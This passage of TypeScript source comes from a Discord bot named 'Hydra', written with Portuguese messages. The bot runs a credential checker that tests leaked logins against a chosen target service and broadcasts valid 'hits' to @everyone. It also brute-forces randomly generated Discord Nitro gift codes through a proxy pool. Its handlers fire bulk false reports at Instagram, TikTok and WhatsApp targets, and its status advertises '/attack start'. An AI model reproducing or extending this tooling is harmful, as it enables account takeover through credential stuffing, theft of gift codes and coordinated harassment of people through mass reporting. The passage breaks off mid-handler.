          `**${credentials.length.toLocaleString()}** credencial${credentials.length === 1 ? "" : "is"} encontrada${credentials.length === 1 ? "" : "s"} para \`${domain}\`` +
          (totalFound > credentials.length ? ` (mostrando ${credentials.length} de ${totalFound.toLocaleString()} total)` : "") +
          `\n\n**Pré-visualização:**\n${previewList}${credentials.length > 5 ? `\n*... e mais ${credentials.length - 5}*` : ""}`,
        )
        .addFields({ name: "🎯 Alvo do Checker", value: `${targetIcon} ${targetLabel}`, inline: true })
        .setTimestamp()
        .setFooter({ text: `${AUTHOR} • Expira em 60s` })],
      components: [confirmRow],
    });
  } catch {
    return;
  }

  // ── Await confirmation ─────────────────────────────────────────────────────
  let confirmInteraction: import("discord.js").ButtonInteraction;
  try {
    confirmInteraction = await replyMsg.awaitMessageComponent({
      componentType: ComponentType.Button,
      filter: (b) => b.user.id === callerId && b.customId.startsWith("url_"),
      time: 60_000,
    });
  } catch {
    await replyMsg.edit({ embeds: [buildErrorEmbed("TEMPO ESGOTADO", "Nenhuma confirmação em 60s.")], components: [] }).catch(() => void 0);
    return;
  }

  if (confirmInteraction.customId === "url_cancel") {
    await confirmInteraction.update({ embeds: [buildErrorEmbed("CANCELADO", "Operação cancelada.")], components: [] });
    return;
  }

  await confirmInteraction.update({ components: [] });

  // ── Run checker streaming ──────────────────────────────────────────────────
  const concurrency  = 10;
  const abortCtrl    = new AbortController();

  const stopRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder().setCustomId(`url_stop_${callerId}`).setLabel("⏹ PARAR").setStyle(ButtonStyle.Danger),
  );

  await replyMsg.edit({
    embeds: [buildLiveCheckerEmbed(
      { total: credentials.length, index: 0, hits: 0, fails: 0, errors: 0, retries: 0, recent: [], allResults: [], done: false, stopped: false, startedAt: Date.now(), credsPerMin: 0 },
      `${domain} → ${targetLabel}`, targetIcon, concurrency,
    )],
    components: [stopRow],
  }).catch(() => void 0);

  const stopCollector = replyMsg.createMessageComponentCollector({
    componentType: ComponentType.Button,
    filter: (b) => b.user.id === callerId && b.customId === `url_stop_${callerId}`,
    time: credentials.length * 6_000 + 120_000,
  });
  stopCollector.on("collect", async b => {
    abortCtrl.abort("user_stop");
    await b.update({ components: [] }).catch(() => void 0);
  });

  let lastUpdate = 0;
  const updateInterval = setInterval(async () => {}, 5_000);

  let finalState: LiveCheckerState;
  try {
    finalState = await runStreamingChecker(
      credentials,
      targetOpt,
      async (state) => {
        const now = Date.now();
        if (now - lastUpdate < 5_000) return;
        lastUpdate = now;
        await replyMsg.edit({
          embeds: [buildLiveCheckerEmbed(state, `${domain} → ${targetLabel}`, targetIcon, concurrency)],
          components: state.done || state.stopped ? [] : [stopRow],
        }).catch(() => void 0);
      },
      abortCtrl,
    );
  } catch (err) {
    clearInterval(updateInterval);
    stopCollector.stop();
    await replyMsg.edit({ embeds: [buildErrorEmbed("ERRO NO CHECKER", `Falha:\n\`${String(err)}\``)], components: [] });
    return;
  }

  clearInterval(updateInterval);
  stopCollector.stop();

  if (finalState.userStopped) {
    await replyMsg.edit({ embeds: [buildLiveCheckerEmbed(finalState, `${domain} → ${targetLabel}`, targetIcon, concurrency)], components: [] }).catch(() => void 0);
    return;
  }

  const searchLabel  = `${domain} → ${targetLabel}`;
  const summaryEmbed2 = buildCheckerSummaryEmbed(finalState, searchLabel, targetIcon, concurrency);
  const txtBuf2       = buildCheckerTxt(finalState.allResults, finalState, searchLabel, targetIcon, concurrency);
  const ts2           = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
  const fileName2     = `checker_${targetLabel.toLowerCase().replace(/[^a-z0-9]/g, "_")}_${ts2}.txt`;
  const attachment2   = new AttachmentBuilder(txtBuf2, { name: fileName2 });

  const editOk2 = await interaction.editReply({ embeds: [summaryEmbed2], files: [attachment2], components: [] })
    .catch(() => null);
  if (!editOk2) {
    if (interaction.channel && "send" in interaction.channel) {
      await (interaction.channel as import("discord.js").TextChannel)
        .send({ embeds: [summaryEmbed2], files: [attachment2] })
        .catch(() => void 0);
    }
  }

  const finalHits = finalState.allResults.filter(r => r.status === "HIT");
  if (finalHits.length > 0 && interaction.channel && "send" in interaction.channel) {
    const hitLines2: string[] = [
      `✅ HITS — ${targetIcon} ${searchLabel}`,
      `${"─".repeat(50)}`,
      "",
      ...finalHits.map((r, i) => `[${String(i + 1).padStart(2, "0")}]  ${r.credential}\n      └─ ${r.detail ?? "—"}`),
      "",
      `${"─".repeat(50)}`,
      `${finalHits.length} hit(s) de ${finalState.total} testada(s)  •  ${AUTHOR}`,
    ];
    const hitsBuf2  = Buffer.from(hitLines2.join("\n"), "utf-8");
    const hitsFile2 = `hits_${targetLabel.toLowerCase().replace(/[^a-z0-9]/g, "_")}_${ts2}.txt`;
    await (interaction.channel as import("discord.js").TextChannel)
      .send({ content: `@everyone 🎯 **${finalHits.length} HIT(S)** encontrado(s) — ${targetIcon} ${searchLabel}`, files: [new AttachmentBuilder(hitsBuf2, { name: hitsFile2 })], allowedMentions: { parse: ["everyone"] } })
      .catch(() => void 0);
  }
}

// ── Main ──────────────────────────────────────────────────────────────────────
async function main(): Promise<void> {
  await deployCommands();

  const client = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.DirectMessages,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.MessageContent,   // required to read attachments from guild messages
      GatewayIntentBits.GuildModeration,
      GatewayIntentBits.GuildVoiceStates, // required for /voice join/sniff — member.voice.channel
      // NOTE: GuildMembers & GuildPresences are Privileged Intents.
      // To enable them: Discord Developer Portal → Bot → Privileged Gateway Intents
      // → toggle "Server Members Intent" and "Presence Intent" → Save → restart bot.
      // Then uncomment the two lines below for join-order and live presence features:
      // GatewayIntentBits.GuildMembers,
      // GatewayIntentBits.GuildPresences,
    ],
    rest: {
      timeout: 60_000,
      // Force Connection: close on every Discord REST request so undici never
      // reuses a stale socket — eliminates "SocketError: other side closed"
      // (UND_ERR_SOCKET) caused by Discord closing idle keep-alive connections.
      makeRequest: (url, init) => {
        const h = new Headers(init.headers as HeadersInit | undefined);
        h.set("connection", "close");
        return fetch(url, { ...(init as RequestInit), headers: h });
      },
    },
  });
  botClient = client; // make accessible for DM alerts

  client.once(Events.ClientReady, c => {
    console.log(`\n╔════════════════════════════════════════╗`);
    console.log(`║   👁️  HYDRA — ONLINE        ║`);
    console.log(`║   Bot: ${c.user.tag.padEnd(32)} ║`);
    console.log(`║   Servers: ${String(c.guilds.cache.size).padEnd(28)} ║`);
    console.log(`╚════════════════════════════════════════╝\n`);
    console.log(`${AUTHOR}`);
    c.user.setPresence({
      activities: [{ name: "⚔️ /attack start — Choose your vector" }],
      status: "online",
    });

    // ── T006: Proactive API health check — alerts all log channels on failure ──
    let apiDownCount = 0;
    setInterval(async () => {
      try {
        const r = await fetch(`${API_BASE}/api/health`, { signal: AbortSignal.timeout(4000) });
        if (r.ok) {
          if (apiDownCount >= 2) {
            console.log("[HEALTH] ✅ API server recovered.");
            // Broadcast recovery to all configured log channels
            for (const guild of c.guilds.cache.values()) {
              const chId = getLogChannelId(guild.id);
              if (!chId) continue;
              const ch = await c.channels.fetch(chId).catch(() => null);
              if (!ch || !ch.isTextBased() || !("send" in ch)) continue;
              await (ch as import("discord.js").TextChannel).send({
                embeds: [new EmbedBuilder()
                  .setColor(COLORS.GREEN)
                  .setTitle("✅ API SERVER — RECUPERADO")
                  .setDescription("O servidor API do Hydra está novamente **online** e respondendo.\n*\"Hydra jamais se rende — a ordem foi restaurada.\"*")
                  .setTimestamp()
                  .setFooter({ text: AUTHOR })],
              }).catch(() => null);
            }
          }
          apiDownCount = 0;
        } else { apiDownCount++; }
      } catch { apiDownCount++; }

      if (apiDownCount === 2) {
        console.warn("[HEALTH] ⚠️ API server DOWN — broadcasting alert.");
        for (const guild of c.guilds.cache.values()) {
          const chId = getLogChannelId(guild.id);
          if (!chId) continue;
          const ch = await c.channels.fetch(chId).catch(() => null);
          if (!ch || !ch.isTextBased() || !("send" in ch)) continue;
          await (ch as import("discord.js").TextChannel).send({
            embeds: [new EmbedBuilder()
              .setColor(COLORS.RED)
              .setTitle("🚨 ALERTA — API SERVER FORA DO AR")
              .setDescription(`O servidor API do **${BOT_NAME}** não está respondendo.\n\n⚠️ Ataques em execução podem ter sido interrompidos.\n*"Mesmo a Hydra pode encontrar resistência. Investigando o problema..."*`)
              .addFields({ name: "🔗 Endpoint", value: `\`${API_BASE}/api/health\``, inline: true })
              .setTimestamp()
              .setFooter({ text: `${AUTHOR} • Health Monitor` })],
          }).catch(() => null);
        }
      }
    }, 5 * 60 * 1000); // check every 5 minutes
  });

  // ── /nitro handler ──────────────────────────────────────────────────────────
  // Improvements:
  //   1. Rate-limit intelligent: reads Retry-After header + automatic retry
  //   2. Parallel concurrency (3 workers) via the API server's proxy pool
  //   3. User history with persistence to data/nitro-history.json
  //   4. Proxy rotation via /api/nitro/check relay (uses the API's proxy pool)
  //   5. Auto log-channel notification on valid code found

  const CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  function genNitroCode(length: 16 | 24): string {
    let code = "";
    for (let i = 0; i < length; i++) code += CHARS[Math.floor(Math.random() * CHARS.length)];
    return code;
  }

  async function sendNitroHitAlert(guildId: string | null, hitCode: string, hitPlan: string, triggeredBy: string): Promise<void> {
    if (!guildId || !botClient) return;
    const logChId = getLogChannelId(guildId);
    if (!logChId) return;
    try {
      const ch = await botClient.channels.fetch(logChId);
      if (!ch || !ch.isTextBased()) return;
      const alertEmbed = new EmbedBuilder()
        .setColor(COLORS.GREEN)
        .setTitle("🎉 NITRO HIT DETECTADO!")
        .setDescription(`Um código Nitro **VÁLIDO** foi encontrado!\n\n🎁 \`${hitCode}\`\n💎 Plano: **${hitPlan}**\n🔗 https://discord.gift/${hitCode}`)
        .addFields(
          { name: "👤 Gerado por", value: `\`${triggeredBy}\``, inline: true },
          { name: "🕐 Hora", value: `<t:${Math.floor(Date.now() / 1000)}:T>`, inline: true },
        )
        .setTimestamp()
        .setFooter({ text: `${AUTHOR} • Nitro Generator` });
      await (ch as import("discord.js").TextChannel).send({ embeds: [alertEmbed] });
    } catch { /* non-fatal */ }
  }

  async function handleNitro(interaction: ChatInputCommandInteraction): Promise<void> {
    const sub = interaction.options.getSubcommand();

    // ── /nitro stats ──────────────────────────────────────────────────────────
    if (sub === "stats") {
      await interaction.deferReply({ flags: MessageFlags.Ephemeral });

      const targetUser = interaction.options.getUser("user") ?? interaction.user;
      const userSessions = nitroHistory.filter(s => s.userId === targetUser.id);

      const embed = new EmbedBuilder()
        .setColor(COLORS.PURPLE)
        .setTitle(`📊 NITRO HISTORY — ${targetUser.username}`)
        .setTimestamp()
        .setFooter({ text: `${AUTHOR} • Nitro Generator` });

      if (userSessions.length === 0) {
        embed.setDescription(`Nenhuma sessão registrada para **${targetUser.username}**.\nUse \`/nitro gen\` para começar!`);
        await interaction.editReply({ embeds: [embed] });
        return;
      }

      // ── Global stats for this user ────────────────────────────────────────
      const totalChecked  = userSessions.reduce((a, s) => a + s.amount, 0);
      const totalValid    = userSessions.reduce((a, s) => a + s.valid, 0);
      const totalInvalid  = userSessions.reduce((a, s) => a + s.invalid, 0);
      const totalRL       = userSessions.reduce((a, s) => a + s.rateLimited, 0);
      const allHits       = userSessions.flatMap(s => s.hitCodes);
      const hitRate       = totalChecked > 0 ? ((totalValid / totalChecked) * 100).toFixed(2) : "0.00";
      const avgDuration   = Math.round(userSessions.reduce((a, s) => a + s.durationMs, 0) / userSessions.length / 1000);

      embed.addFields(
        {
          name: "🎯 Estatísticas Globais",
          value: [
            `📦 **Sessões:** ${userSessions.length}`,
            `🔢 **Total checado:** ${totalChecked}`,
            `✅ **Válidos:** ${totalValid}   ❌ **Inválidos:** ${totalInvalid}   ⏳ **Rate-limited:** ${totalRL}`,
            `📈 **Hit rate:** ${hitRate}%`,
            `⏱️ **Duração média:** ${avgDuration}s`,
          ].join("\n"),
          inline: false,
        },
      );

      // ── Recent sessions (last 5) ──────────────────────────────────────────
      const recent = [...userSessions].reverse().slice(0, 5);
      const sessLines = recent.map((s, i) => {
        const dt   = `<t:${Math.floor(s.timestamp / 1000)}:R>`;
        const hits = s.valid > 0 ? ` 🎁 **${s.valid} HIT(S)**` : "";
        return `\`#${userSessions.length - i}\` ${dt} — ${s.amount} códigos — ${s.codeType}${hits}`;
      }).join("\n");
      embed.addFields({ name: "🕐 Sessões Recentes", value: sessLines, inline: false });

      // ── All valid codes found (limited) ──────────────────────────────────
      if (allHits.length > 0) {
        const hitLines = allHits.slice(-10).map(h => `🎁 \`${h.code}\` — **${h.plan}**\nhttps://discord.gift/${h.code}`).join("\n");
        embed.addFields({ name: `🏆 Códigos Válidos Encontrados (${allHits.length} total)`, value: hitLines.slice(0, 1024), inline: false });
      }

      await interaction.editReply({ embeds: [embed] });
      return;
    }

    // ── /nitro check — verify a specific code ─────────────────────────────────
    if (sub === "check") {
      const code = interaction.options.getString("code", true).trim();
      await interaction.deferReply({ flags: MessageFlags.Ephemeral });

      // Use API server relay (proxy pool)
      let result: NitroCodeResult;
      try {
        const resp = await api.checkNitroCodes([code]);
        result = resp.results[0] ?? { code, status: "error" };
      } catch {
        result = { code, status: "error" };
      }

      const embed = new EmbedBuilder().setTimestamp().setFooter({ text: `${AUTHOR} • Nitro Checker` });

      if (result.status === "valid") {
        embed
          .setColor(COLORS.GREEN)
          .setTitle("✅ CÓDIGO NITRO VÁLIDO!")
          .setDescription(`🎁 O código **\`${code}\`** é **VÁLIDO**!\n\n💎 Plano: **${result.plan}**\n🔗 https://discord.gift/${code}\n\n*"Hydra revelou um tesouro."*`);
        // Alert log channel
        void sendNitroHitAlert(interaction.guildId, code, result.plan ?? "Nitro", interaction.user.username);
      } else if (result.status === "rate_limited") {
        embed
          .setColor(COLORS.ORANGE)
          .setTitle("⏳ RATE LIMITED — Retry automático ativado")
          .setDescription(`A API do Discord está limitando requisições.\nO servidor tentou novamente automaticamente.\n\`\`\`${code}\`\`\`\nAguarde alguns segundos e tente de novo.`);
      } else if (result.status === "invalid") {
        embed
          .setColor(COLORS.RED)
          .setTitle("❌ CÓDIGO INVÁLIDO")
          .setDescription(`O código **\`${code}\`** não é válido ou já foi resgatado.\n\n*"Nem toda missão funciona."*`);
      } else {
        embed
          .setColor(COLORS.ORANGE)
          .setTitle("⚠️ ERRO AO VERIFICAR")
          .setDescription(`Não foi possível verificar o código. Verifique se o API server está online.\n\`\`\`${code}\`\`\``);
      }

      await interaction.editReply({ embeds: [embed] });
      return;
    }

    // ── /nitro gen — INFINITE background generator (public embed + stop button) ──
    if (sub === "gen") {
      const batchSize = interaction.options.getInteger("batch") ?? 20;
      const codeType  = (interaction.options.getString("type") ?? "both") as "classic" | "boost" | "both";
      const channelId = interaction.channelId;

      // One generator per channel — stop existing one first
      if (activeGenerators.has(channelId)) {
        const existing = activeGenerators.get(channelId)!;
        existing.running = false;
        if (existing.loopHandle) clearTimeout(existing.loopHandle);
        activeGenerators.delete(channelId);
      }

      const typeLabel = codeType === "classic" ? "🎮 Classic (16)" : codeType === "boost" ? "💎 Boost (24)" : "🔀 Classic + Boost";

      // ── Post PUBLIC embed (non-ephemeral) ────────────────────────────────
      await interaction.deferReply(); // no ephemeral flag → PUBLIC

      const stopBtn = new ActionRowBuilder<ButtonBuilder>().addComponents(
        new ButtonBuilder()
          .setCustomId(`nitro_stop_${channelId}`)
          .setLabel("⏹ Parar Gerador")
          .setStyle(ButtonStyle.Danger),
      );

      const buildGenEmbed = (gen: NitroGenerator, status: "running" | "stopped") => {
        const elapsed   = Math.round((Date.now() - gen.stats.startTime) / 1000);
        const mins      = Math.floor(elapsed / 60);
        const secs      = elapsed % 60;
        const timeStr   = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
        const speedMin  = elapsed > 0 ? Math.round((gen.stats.total / elapsed) * 60) : 0;
        const hitRate   = gen.stats.total > 0 ? ((gen.stats.valid / gen.stats.total) * 100).toFixed(3) : "0.000";
        const lastBatch = gen.stats.lastBatchAt > 0 ? `<t:${Math.floor(gen.stats.lastBatchAt / 1000)}:R>` : "—";
        const checked   = gen.stats.total;
        const invalid   = gen.stats.invalid;
        const rl        = gen.stats.rateLimited;
        const errs      = gen.stats.errors;
        const hits      = gen.stats.valid;
        const cycles    = gen.stats.batches;

        // Progress bar helpers (10 chars wide)
        const bar = (val: number, total: number, len = 10): string => {
          if (total === 0) return "░".repeat(len);
          const filled = Math.round((val / total) * len);
          return "▓".repeat(filled) + "░".repeat(len - filled);
        };

        const statusLine = status === "running"
          ? (hits > 0 ? "🟢  **ATIVO — HIT ENCONTRADO**" : "🟣  **ATIVO — Rodando em background**")
          : "🔴  **PARADO**";

        const statsBlock = [
          `\`\`\``,
          `  Checados   ${String(checked).padStart(7)}    Ciclos    ${String(cycles).padStart(6)}`,
          `  Válidos    ${String(hits).padStart(7)}    Inválidos ${String(invalid).padStart(6)}`,
          `  RL         ${String(rl).padStart(7)}    Erros     ${String(errs).padStart(6)}`,
          `\`\`\``,
        ].join("\n");

        const hitRateBar = bar(hits, checked, 12);
        const metricsLine = [
          `**Hit Rate** \`[${hitRateBar}] ${hitRate}%\``,
          `**Velocidade** \`${speedMin} cod/min\`  **Tempo** \`${timeStr}\``,
          `**Tipo** \`${typeLabel}\`  **Batch** \`${gen.batchSize} códigos\`  **Último ciclo** ${lastBatch}`,
        ].join("\n");

        const hitLines = gen.stats.hits.slice(-5).reverse().map((h, i) =>
          `${i === 0 ? "✨" : "🎁"} \`${h.code}\` — **${h.plan}**\n> <https://discord.gift/${h.code}>`
        ).join("\n");

        const embed = new EmbedBuilder()
          .setColor(status === "running" ? (hits > 0 ? COLORS.GREEN : COLORS.PURPLE) : COLORS.GRAY)
          .setTitle(
            status === "running"
              ? (hits > 0 ? "🎉  NITRO GENERATOR — HIT ENCONTRADO!" : "⚡  NITRO GENERATOR")
              : "⏹  NITRO GENERATOR — Parado"
          )
          .setDescription(
            status === "running"
              ? `${statusLine}\n${statsBlock}\n${metricsLine}`
              : `🔴 Gerador parado por <@${gen.userId}>.\nUse \`/nitro gen\` para reiniciar.\n\n${statsBlock}`
          )
          .setTimestamp()
          .setFooter({ text: `${AUTHOR} • Nitro Generator • ${interaction.user.username}` });

        if (hits > 0) {
          embed.addFields({
            name: `🏆  Últimos ${Math.min(5, hits)} Hit(s)  —  ${hits} total`,
            value: hitLines.slice(0, 1024),
            inline: false,
          });
        }

        return embed;
      };

      // Initial gen object
      const gen: NitroGenerator = {
        loopHandle:  null,
        running:     true,
        channelId,
        guildId:     interaction.guildId,
        messageId:   "",
        userId:      interaction.user.id,
        username:    interaction.user.username,
        batchSize,
        codeType,
        stats: {
          total: 0, valid: 0, invalid: 0, rateLimited: 0, errors: 0,
          batches: 0, startTime: Date.now(), lastBatchAt: 0, hits: [],
        },
      };
      activeGenerators.set(channelId, gen);

      await interaction.editReply({ embeds: [buildGenEmbed(gen, "running")], components: [stopBtn] });
      const msg = await interaction.fetchReply();
      gen.messageId = msg.id;

      // ── Background loop ───────────────────────────────────────────────────
      const runBatch = async () => {
        const g = activeGenerators.get(channelId);
        if (!g || !g.running) return;

        // Generate codes for this batch
        const codes: string[] = [];
        for (let i = 0; i < g.batchSize; i++) {
          if (g.codeType === "classic")    codes.push(genNitroCode(16));
          else if (g.codeType === "boost") codes.push(genNitroCode(24));
          else codes.push(genNitroCode(i % 2 === 0 ? 16 : 24));
        }

        // Call API server
        try {
          const resp = await api.checkNitroCodes(codes);
          for (const r of resp.results) {
            if (r.status === "valid") {
              g.stats.valid++;
              g.stats.hits.push({ code: r.code, plan: r.plan ?? "Nitro", at: Date.now() });
              if (g.stats.hits.length > 50) g.stats.hits = g.stats.hits.slice(-50);
              void sendNitroHitAlert(g.guildId, r.code, r.plan ?? "Nitro", g.username);
            } else if (r.status === "invalid") {
              g.stats.invalid++;
            } else if (r.status === "rate_limited") {
              g.stats.rateLimited++;
            } else {
              g.stats.errors++;
            }
          }
          g.stats.total   += codes.length;
          g.stats.batches += 1;
          g.stats.lastBatchAt = Date.now();

          // Save batch to history
          pushNitroSession({
            id:          `nitro_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`,
            userId:      g.userId,
            username:    g.username,
            guildId:     g.guildId,
            timestamp:   Date.now(),
            amount:      codes.length,
            codeType:    g.codeType,
            valid:       resp.results.filter(r => r.status === "valid").length,
            invalid:     resp.results.filter(r => r.status === "invalid").length,
            rateLimited: resp.results.filter(r => r.status === "rate_limited").length,
            errors:      resp.results.filter(r => r.status === "error").length,
            hitCodes:    resp.results.filter(r => r.status === "valid").map(r => ({ code: r.code, plan: r.plan ?? "Nitro" })),
            durationMs:  0,
            proxyCount:  resp.proxyCount,
          });
        } catch {
          g.stats.errors += codes.length;
        }

        // Update the embed via direct message edit (works even after 15-min token expiry)
        try {
          const channel = await client.channels.fetch(channelId);
          if (channel && channel.isTextBased() && "messages" in channel) {
            await (channel as import("discord.js").TextChannel).messages.edit(
              g.messageId,
              { embeds: [buildGenEmbed(g, "running")], components: [stopBtn] },
            );
          }
        } catch { /* silently skip if message was deleted */ }

        // Schedule next batch (5 seconds grace between cycles)
        if (activeGenerators.get(channelId)?.running) {
          g.loopHandle = setTimeout(() => { void runBatch(); }, 5_000);
        }
      };

      // Start first batch immediately
      gen.loopHandle = setTimeout(() => { void runBatch(); }, 2_000);
      return;
    }

    // ── /nitro oneshot — generate + check N codes, return when done ───────────
    if (sub === "oneshot") {
      const amount = interaction.options.getInteger("amount") ?? 50;
      const type   = (interaction.options.getString("type") ?? "both") as "classic" | "boost" | "both";

      await interaction.deferReply({ flags: MessageFlags.Ephemeral });

      const codes: string[] = [];
      for (let i = 0; i < amount; i++) {
        if (type === "classic")    codes.push(genNitroCode(16));
        else if (type === "boost") codes.push(genNitroCode(24));
        else codes.push(genNitroCode(i % 2 === 0 ? 16 : 24));
      }
      const typeLabel = type === "classic" ? "🎮 Classic (16)" : type === "boost" ? "💎 Boost (24)" : "🔀 Classic + Boost";

      await interaction.editReply({
        embeds: [new EmbedBuilder()
          .setColor(COLORS.ORANGE)
          .setTitle("⚡ NITRO ONESHOT — Processando...")
          .setDescription(`Verificando **${amount}** código(s)…\n🔄 Tipo: ${typeLabel}\n\n⏳ Aguarde, isso pode levar alguns minutos...`)
          .setTimestamp()
          .setFooter({ text: `${AUTHOR} • Nitro One-Shot` })],
      });

      const startTime = Date.now();
      let results: NitroCodeResult[] = [];
      let proxyCount = 0;

      try {
        const resp = await api.checkNitroCodes(codes);
        results    = resp.results;
        proxyCount = resp.proxyCount;
      } catch (err) {
        await interaction.editReply({
          embeds: [new EmbedBuilder()
            .setColor(COLORS.RED)
            .setTitle("⚠️ ERRO — API SERVER INACESSÍVEL")
            .setDescription(`\`\`\`${String(err).slice(0, 200)}\`\`\``)
            .setTimestamp()
            .setFooter({ text: AUTHOR })],
        });
        return;
      }

      const durationMs  = Date.now() - startTime;
      const valid       = results.filter(r => r.status === "valid");
      const invalid     = results.filter(r => r.status === "invalid");
      const rateLimited = results.filter(r => r.status === "rate_limited");
      const errors      = results.filter(r => r.status === "error");
      const hasHit      = valid.length > 0;
      const hitRate     = ((valid.length / amount) * 100).toFixed(1);
      const durationSec = (durationMs / 1000).toFixed(1);

      for (const hit of valid) {
        void sendNitroHitAlert(interaction.guildId, hit.code, hit.plan ?? "Nitro", interaction.user.username);
      }

      const sessionId = `nitro_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`;
      pushNitroSession({
        id: sessionId, userId: interaction.user.id, username: interaction.user.username,
        guildId: interaction.guildId, timestamp: Date.now(), amount, codeType: type,
        valid: valid.length, invalid: invalid.length, rateLimited: rateLimited.length,
        errors: errors.length, hitCodes: valid.map(r => ({ code: r.code, plan: r.plan ?? "Nitro" })),
        durationMs, proxyCount,
      });

      const resultEmbed = new EmbedBuilder()
        .setColor(hasHit ? COLORS.GREEN : COLORS.RED)
        .setTitle(hasHit ? "🎉 NITRO HIT ENCONTRADO!" : "🎁 NITRO ONESHOT — Resultado")
        .setDescription(hasHit ? `*"Hydra revelou um presente!"*` : `*"Hydra busca. Use \`/nitro stats\` para ver o acumulado."*`)
        .addFields(
          {
            name: "📊 Resultado",
            value: [
              `🎯 **Gerados:** ${amount}   |   Tipo: ${typeLabel}`,
              `✅ **Válidos:** ${valid.length}   ❌ **Inválidos:** ${invalid.length}`,
              `⏳ **Rate-limited:** ${rateLimited.length}   ⚠️ **Erros:** ${errors.length}`,
              `📈 **Hit rate:** ${hitRate}%`,
              `⏱️ **Duração:** ${durationSec}s   🌐 **Proxies no pool:** ${proxyCount}`,
            ].join("\n"),
            inline: false,
          },
          ...(valid.length > 0 ? [{
            name: "🏆 CÓDIGOS VÁLIDOS",
            value: valid.map(v => `🎁 \`${v.code}\` — **${v.plan ?? "Nitro"}**\nhttps://discord.gift/${v.code}`).join("\n\n").slice(0, 1024),
            inline: false,
          }] : []),
          ...(invalid.length > 0 ? [{
            name: `❌ Amostra de Inválidos (${Math.min(10, invalid.length)} de ${invalid.length})`,
            value: invalid.slice(0, 10).map(r => `\`${r.code}\``).join("\n"),
            inline: false,
          }] : []),
        )
        .setTimestamp()
        .setFooter({ text: `${AUTHOR} • Nitro One-Shot • Session ${sessionId.slice(-6)}` });

      await interaction.editReply({ embeds: [resultEmbed] });
    }
  }

  // ── /reportredes handler ──────────────────────────────────────────────────────
  async function handleReportRedes(interaction: ChatInputCommandInteraction): Promise<void> {
    const alvo      = interaction.options.getString("alvo", true).trim();
    const quantidade = interaction.options.getInteger("quantidade") ?? 10;
    const uid = interaction.user.id;

    await interaction.deferReply();

    const loadEmbed = new EmbedBuilder()
      .setColor(COLORS.PURPLE)
      .setTitle("📢 Report Redes Sociais")
      .setDescription(`Detectando plataforma e disparando **${quantidade}** reports para \`${alvo}\`…\n🔄 Aguarde, isso pode levar alguns segundos.`)
      .setFooter({ text: AUTHOR });
    await interaction.editReply({ embeds: [loadEmbed] });

    type SocialResult = { platform?: string; target?: string; sent?: number; failed?: number; total?: number; error?: string };
    let result: SocialResult = {};
    try {
      const resp = await fetch(`${API_BASE}/api/social/report`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: alvo, quantity: quantidade }),
        signal: AbortSignal.timeout(120_000),
      });
      result = await resp.json() as SocialResult;
    } catch (e) {
      result = { error: String(e) };
    }

    const sent   = result.sent ?? 0;
    const failed = result.failed ?? quantidade;
    const total  = result.total ?? quantidade;
    const plat   = result.platform ?? "?";
    const target = result.target ?? alvo;

    const PLAT_EMOJIS: Record<string, string> = {
      instagram: "📸", tiktok: "🎵",
    };
    const platEmoji = PLAT_EMOJIS[plat] ?? "🌐";

    const ok = sent > 0;
    const resultEmbed = new EmbedBuilder()
      .setColor(ok ? COLORS.GREEN : COLORS.CRIMSON)
      .setTitle(`${platEmoji} Report ${plat.toUpperCase()} — Resultado`)
      .setDescription(ok
        ? `*"Hydra age nas sombras digitais. ${sent} reports enviados — o alvo está marcado."*`
        : `*"Falha na operação. Verifique o alvo e tente novamente."*`)
      .addFields(
        { name: "🎯 Alvo",      value: `\`@${target}\``,                           inline: true },
        { name: "✅ Enviados",  value: `\`${sent}/${total}\``,                       inline: true },
        { name: "❌ Falhos",    value: `\`${failed}\``,                              inline: true },
      )
      .setFooter({ text: `${AUTHOR} • Redes Sociais Report • ${uid}` })
      .setTimestamp();

    if (result.error) {
      resultEmbed.addFields({ name: "⚠️ Erro", value: `\`${result.error.slice(0, 200)}\`` });
    }

    await interaction.editReply({ embeds: [resultEmbed] });
  }

  // ── /whatsapp handler ───────────────────────────────────────────────────────
  async function handleWhatsapp(interaction: ChatInputCommandInteraction): Promise<void> {
    const sub = interaction.options.getSubcommand();
    const uid = interaction.user.id;

    if (sub === "report") {
      const numero     = interaction.options.getString("numero", true).trim();
      const quantidade = interaction.options.getInteger("quantidade") ?? 10;

      // ── Cooldown check ─────────────────────────────────────────────────────
      const wait = checkWaCooldown(waReportCooldowns, uid, WA_REPORT_COOLDOWN_MS);
      if (wait > 0) {
        const sec = Math.ceil(wait / 1000);
        const cdEmbed = new EmbedBuilder()
          .setColor(COLORS.CRIMSON)
          .setTitle("⏳ Cooldown Ativo")
          .setDescription(`Aguarde **${sec}s** antes de enviar outro report.`)
          .setFooter({ text: AUTHOR });
        await interaction.reply({ embeds: [cdEmbed], flags: MessageFlags.Ephemeral });
        return;
      }

      await interaction.deferReply();
      waReportCooldowns.set(uid, Date.now());

      const loadEmbed = new EmbedBuilder()
        .setColor(COLORS.CRIMSON)
        .setTitle("🚩 Report WhatsApp")
        .setDescription(`Enviando **${quantidade}** report(s) para \`${numero}\`…\n⚡ Paralelo • Motivos rotativos • Retry automático`)
        .setFooter({ text: AUTHOR });
      await interaction.editReply({ embeds: [loadEmbed] });

      let result: { sent?: number; failed?: number; requested?: number; errors?: string[]; error?: string; number?: string } = {};
      try {
        const resp = await fetch(`${API_BASE}/api/whatsapp/report`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ number: numero, quantity: quantidade, userId: uid }),
          signal: AbortSignal.timeout(120_000),
        });
        result = await resp.json() as typeof result;
      } catch (e) {
        result = { error: String(e) };
      }

      const sent = result.sent ?? 0;
      addWaHistoryDiscord(uid, { type: "report", number: result.number ?? numero, sent, total: result.requested ?? quantidade, at: Date.now() });

      const ok = sent > 0;
      const embed = new EmbedBuilder()
        .setColor(ok ? COLORS.GOLD : COLORS.CRIMSON)
        .setTitle("🚩 WhatsApp Report — Resultado")
        .addFields(
          { name: "📱 Número",   value: `\`${result.number ?? numero}\``,                                    inline: true },
